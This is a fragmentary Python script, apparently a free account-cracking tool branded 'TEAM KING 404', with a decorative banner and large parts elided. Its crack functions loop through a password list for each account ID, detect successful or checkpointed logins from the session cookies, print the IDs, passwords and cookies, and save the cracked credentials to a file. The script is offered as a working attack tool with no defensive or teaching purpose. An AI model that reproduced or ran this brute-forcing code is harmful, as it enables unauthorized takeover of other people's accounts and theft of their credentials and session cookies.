...
\x1b[1;97m      j88D   .d88b.    j88D  
    ...
    V88888D 88 d' 88 V88888D 
        ...
        VP   `Y88P'      VP                                                  
--------------------------------------
 [*] Author   : TEAM KING 404
 [*] GitHub   : TEAM KING 404
 [*] TOOL     : FREE
 [*] Version  : 0.1
--------------------------------------""")
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\33[91m[TEAM-404-CP] {idf}|{pw}')
                ...
                print(f'\r\33[92m[TEAM-404-OK] {idf}|{pw} | {kuki}')
...
def crack2(idf,pwv,nmf):
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[TEAM-404-CP] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
